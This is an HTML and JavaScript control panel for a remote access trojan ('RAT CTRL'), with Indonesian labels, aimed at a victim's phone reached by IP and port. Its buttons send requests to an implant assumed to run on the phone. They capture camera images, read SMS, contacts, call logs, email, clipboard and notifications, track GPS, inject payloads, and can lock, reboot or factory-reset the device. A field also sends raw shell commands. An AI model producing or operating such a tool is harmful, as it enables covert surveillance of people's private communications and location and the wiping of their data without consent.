<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>RAT CTRL · WAITING SIGNAL</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000000;
            font-family: 'Inter', 'Segoe UI', monospace;
            padding: 18px;
            color: #0f0;
        }
        .container {
            max-width: 560px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            margin-bottom: 25px;
            border-bottom: 1px solid #1f3f1f;
            padding-bottom: 12px;
        }
        .header h1 {
            font-size: 1.6rem;
            letter-spacing: 3px;
            text-shadow: 0 0 5px #0f0;
            color: #0f0;
        }
        .ip-section {
            background: #0a0f0a;
            border-radius: 32px;
            padding: 14px 18px;
            margin-bottom: 22px;
            border: 1px solid #2a6e2a;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            align-items: center;
        }
        .ip-section input {
            flex: 3;
            background: #111;
            border: 1px solid #3a8a3a;
            padding: 12px 16px;
            border-radius: 40px;
            color: #0f0;
            font-family: monospace;
            font-weight: bold;
            font-size: 1rem;
        }
        .ip-section button {
            background: #1f4f1f;
            border: none;
            padding: 12px 20px;
            border-radius: 40px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        .status-target {
            background: #050a05;
            border-radius: 20px;
            padding: 8px 15px;
            margin-bottom: 20px;
            font-size: 0.8rem;
            display: flex;
            justify-content: space-between;
            border-left: 4px solid #0f0;
        }
        .grid-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(135px, 1fr));
            gap: 12px;
            margin-bottom: 25px;
        }
        .cmd-btn {
            background: #0c120c;
            border: 1px solid #2c6e2c;
            border-radius: 28px;
            padding: 12px 6px;
            text-align: center;
            font-weight: 600;
            font-size: 0.85rem;
            cursor: pointer;
            transition: 0.1s linear;
            color: #bfffb0;
            display: flex;
            flex-direction: column;
            gap: 5px;
            backdrop-filter: blur(2px);
        }
        .cmd-btn:active {
            transform: scale(0.96);
            background: #1f3a1f;
        }
        .console-area {
            background: #010201;
            border-radius: 24px;
            border: 1px solid #2e6e2e;
            padding: 14px;
            margin-top: 10px;
        }
        .console-header {
            display: flex;
            justify-content: space-between;
            font-size: 0.75rem;
            margin-bottom: 12px;
            color: #6f9e6f;
        }
        .log-window {
            background: #000c00;
            min-height: 210px;
            max-height: 280px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.7rem;
            padding: 10px;
            border-radius: 18px;
        }
        .log-line {
            border-bottom: 0.5px solid #1e3a1e;
            padding: 5px 0;
            color: #9eff9e;
            word-break: break-word;
        }
        .payload-row {
            display: flex;
            gap: 10px;
            margin: 15px 0 8px;
        }
        .payload-row input {
            flex: 4;
            background: #0f1a0f;
            border: 1px solid #2c862c;
            padding: 10px;
            border-radius: 40px;
            color: #0f0;
        }
        .payload-row button {
            background: #2c6e2c;
            border: none;
            border-radius: 40px;
            padding: 0 18px;
            font-weight: bold;
        }
        .note {
            font-size: 0.6rem;
            text-align: center;
            margin-top: 15px;
            color: #4f7a4f;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>📡 WAITING SIGNAL</h1>
    </div>

    <div class="ip-section">
        <input type="text" id="targetIpInput" placeholder="IP TARGET (kartu HP) — contoh: 192.168.43.1:8080" value="">
        <button id="setIpBtn">🔗 SET & BIND</button>
    </div>
    <div class="status-target" id="statusDisplay">
        <span>🎯 TARGET:</span>
        <span id="targetLabel">belum diset</span>
        <span id="connStatus">⚫ offline</span>
    </div>

    <div class="grid-buttons" id="commandGrid"></div>

    <div class="console-area">
        <div class="console-header">
            <span>🖥️ COMMAND FEEDBACK (RAW)</span>
            <span id="pingSpan">⬤</span>
        </div>
        <div class="payload-row">
            <input type="text" id="customPayloadField" placeholder="⚡ payload manual / shell command">
            <button id="execPayloadBtn">EXEC</button>
        </div>
        <div class="log-window" id="logWindow">
            <div class="log-line">[>] sistem siap — mode RAT over IP</div>
            <div class="log-line">[>] gunakan IP + port target (kartu SIM / hotspot)</div>
        </div>
    </div>
    <div class="note">
        📋 catatan: diperlukan server pendengar di hp target (termux / aplikasi RAT). semua request dikirim ke IP:PORT via fetch.
    </div>
</div>

<script>
    // ----------------------------------------------
    // DAFTAR PERINTAH LENGKAP (21 fitur dari foto)
    // ----------------------------------------------
    const commandList = [
        { id: "frontcam", label: "CAM DEPAN", api: "/api/cam/front", desc: "front camera capture" },
        { id: "backcam", label: "CAM BELAKANG", api: "/api/cam/back", desc: "rear camera" },
        { id: "stopcam", label: "STOP CAM", api: "/api/cam/stop", desc: "stop stream" },
        { id: "smsnew", label: "SMS BARU", api: "/api/sms/inbox?new=1", desc: "baca sms baru" },
        { id: "smsold", label: "SMS LAMA", api: "/api/sms/all", desc: "semua sms" },
        { id: "contacts", label: "KONTAK", api: "/api/contacts", desc: "daftar kontak" },
        { id: "calls", label: "PANGGILAN", api: "/api/calllog", desc: "riwayat panggilan" },
        { id: "sysinfo", label: "SISTEM", api: "/api/system", desc: "info device" },
        { id: "email", label: "EMAIL", api: "/api/email/latest", desc: "email terbaru" },
        { id: "location", label: "LOKASI", api: "/api/gps", desc: "gps + maps" },
        { id: "network", label: "JARINGAN", api: "/api/netstat", desc: "ip/wifi/mobile" },
        { id: "notif", label: "NOTIFIKASI", api: "/api/notifications", desc: "notifikasi sistem" },
        { id: "clip", label: "CLIPBOARD", api: "/api/clipboard", desc: "copy teks" },
        { id: "apps", label: "APLIKASI", api: "/api/applist", desc: "daftar installed" },
        { id: "payload", label: "PAYLOAD", api: "/api/payload/inject", desc: "injeksi custom" },
        { id: "wifihist", label: "WIFI HIST", api: "/api/wifi/history", desc: "ssid tersimpan" },
        { id: "lock", label: "LOCK", api: "/api/device/lock", desc: "kunci layar paksa" },
        { id: "unlock", label: "UNLOCK", api: "/api/device/unlock", desc: "buka kunci" },
        { id: "reboot", label: "REBOOT", api: "/api/system/reboot", desc: "restart device" },
        { id: "reset", label: "RESET", api: "/api/system/factoryreset", desc: "reset pabrik" }
    ];

    let currentTarget = "";      // format IP:PORT contoh 192.168.1.5:3000
    let isConnectedFlag = false;

    const targetInput = document.getElementById("targetIpInput");
    const setBtn = document.getElementById("setIpBtn");
    const targetLabelSpan = document.getElementById("targetLabel");
    const connStatusSpan = document.getElementById("connStatus");
    const logWindow = document.getElementById("logWindow");
    const customPayloadInput = document.getElementById("customPayloadField");
    const execPayloadBtn = document.getElementById("execPayloadBtn");

    // fungsi log
    function addToLog(message, isError = false) {
        const logDiv = document.createElement("div");
        logDiv.className = "log-line";
        const timestamp = new Date().toLocaleTimeString('en-GB', { hour12: false });
        const prefix = isError ? "⚠️" : ">";
        logDiv.innerHTML = `<span style="color:#4f9a4f;">[${timestamp}]</span> ${prefix} ${message}`;
        if (isError) logDiv.style.color = "#ffa07a";
        logWindow.appendChild(logDiv);
        logDiv.scrollIntoView({ behavior: "smooth", block: "nearest" });
        while (logWindow.children.length > 150) logWindow.removeChild(logWindow.firstChild);
    }

    // fungsi kirim command ke target (IP:PORT)
    async function sendCommandToTarget(endpoint, extraPayload = null) {
        if (!currentTarget) {
            addToLog("❌ TIDAK ADA IP TARGET! set IP terlebih dahulu.", true);
            throw new Error("no target");
        }
        let url = `http://${currentTarget}${endpoint}`;
        let options = {
            method: "GET",
            headers: { "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/json" }
        };
        if (extraPayload) {
            options.method = "POST";
            options.body = JSON.stringify({ cmd: extraPayload, data: extraPayload });
        }
        addToLog(`📡 request → ${url} ${extraPayload ? '(payload)' : ''}`);
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 7000);
            const response = await fetch(url, { ...options, signal: controller.signal });
            clearTimeout(timeoutId);
            const responseText = await response.text();
            let prettyResponse = responseText.length > 300 ? responseText.substring(0, 300) + "…" : responseText;
            addToLog(`✅ respon (${response.status}): ${prettyResponse || "(empty)"}`);
            connStatusSpan.innerHTML = "🟢 online";
            connStatusSpan.style.color = "#2eff7a";
            return responseText;
        } catch (err) {
            let errMsg = err.name === "AbortError" ? "timeout 7 detik" : err.message;
            addToLog(`❌ gagal: ${errMsg} | pastikan listener aktif di ${currentTarget}`, true);
            connStatusSpan.innerHTML = "🔴 offline";
            connStatusSpan.style.color = "#ff7777";
            isConnectedFlag = false;
            return null;
        }
    }

    // generate tombol berdasarkan commandList
    const gridContainer = document.getElementById("commandGrid");
    function buildButtons() {
        gridContainer.innerHTML = "";
        commandList.forEach(cmd => {
            const btn = document.createElement("div");
            btn.className = "cmd-btn";
            let icon = "⚡";
            if (cmd.label.includes("CAM")) icon = "📷";
            if (cmd.label.includes("SMS")) icon = "💬";
            if (cmd.label === "LOKASI") icon = "📍";
            if (cmd.label === "REBOOT") icon = "🔄";
            if (cmd.label === "RESET") icon = "⚠️";
            if (cmd.label === "LOCK") icon = "🔒";
            if (cmd.label === "UNLOCK") icon = "🔓";
            btn.innerHTML = `<span style="font-size:1.5rem;">${icon}</span><span>${cmd.label}</span>`;
            btn.addEventListener("click", async () => {
                if (!currentTarget) {
                    addToLog(`❌ klik ${cmd.label} gagal: belum set IP target`, true);
                    return;
                }
                addToLog(`⚙️ menjalankan: ${cmd.label} → endpoint ${cmd.api}`);
                await sendCommandToTarget(cmd.api, null);
                // efek khusus untuk reboot / reset / lock / unlock biar lebih real
                if (cmd.id === "reboot") {
                    addToLog("⚠️ PERINTAH REBOOT dikirim, perangkat akan restart jika API mendukung");
                }
                if (cmd.id === "reset") {
                    addToLog("🔥 RESET PABRIK dikirim. semua data pengguna akan terhapus (simulasi command)");
                }
                if (cmd.id === "lock") addToLog("🔒 lock command → layar terkunci");
                if (cmd.id === "unlock") addToLog("🔓 unlock command → akses penuh");
            });
            gridContainer.appendChild(btn);
        });
    }

    // SET IP TARGET
    setBtn.addEventListener("click", () => {
        let rawIp = targetInput.value.trim();
        if (rawIp === "") {
            addToLog("Masukkan IP target dengan format IP:PORT (contoh: 10.42.0.55:4747)", true);
            return;
        }
        if (!rawIp.includes(":")) {
            rawIp = rawIp + ":8080";
            addToLog(`📋 otomatis menambahkan port default :8080 → ${rawIp}`);
        }
        currentTarget = rawIp;
        targetLabelSpan.innerText = currentTarget;
        addToLog(`🎯 TARGET DI SET: ${currentTarget} | siap mengirim perintah via kartu/hotspot`);
        connStatusSpan.innerHTML = "🟡 cek...";
        // test ping sederhana dulu (opsional)
        setTimeout(() => {
            sendCommandToTarget("/api/ping", null).catch(e => {});
        }, 100);
    });

    // payload custom (manual)
    execPayloadBtn.addEventListener("click", async () => {
        let customCmd = customPayloadInput.value.trim();
        if (!customCmd) {
            addToLog("payload kosong, tidak dikirim", true);
            return;
        }
        if (!currentTarget) {
            addToLog("set IP target terlebih dahulu sebelum kirim payload", true);
            return;
        }
        addToLog(`⚡ CUSTOM PAYLOAD: "${customCmd}" → mengirim ke /api/raw`);
        await sendCommandToTarget("/api/raw", customCmd);
        customPayloadInput.value = "";
    });

    // support enter di payload
    customPayloadInput.addEventListener("keypress", (e) => {
        if (e.key === "Enter") {
            e.preventDefault();
            execPayloadBtn.click();
        }
    });

    // simpan IP ke localstorage optional
    function loadSavedIp() {
        let saved = localStorage.getItem("rat_target_ip");
        if (saved) {
            targetInput.value = saved;
            currentTarget = saved;
            targetLabelSpan.innerText = currentTarget;
            addToLog(`💾 IP tersimpan dimuat: ${currentTarget}`);
            connStatusSpan.innerHTML = "🟡 standby";
        }
    }
    function saveCurrentIp() {
        if (currentTarget) localStorage.setItem("rat_target_ip", currentTarget);
    }
    window.addEventListener("beforeunload", () => saveCurrentIp());
    
    // inisialisasi
    buildButtons();
    loadSavedIp();
    addToLog("🔌 panel ready. isi IP kartu hp target (jalankan http server di hp target via termux / sir");
    addToLog("📌 pastikan hp target menjalankan REST API yang sama endpoint /api/xxx");
    addToLog("📋 contoh target: 192.168.43.20:3030 (port bebas)");
</script>
</body>
</html>
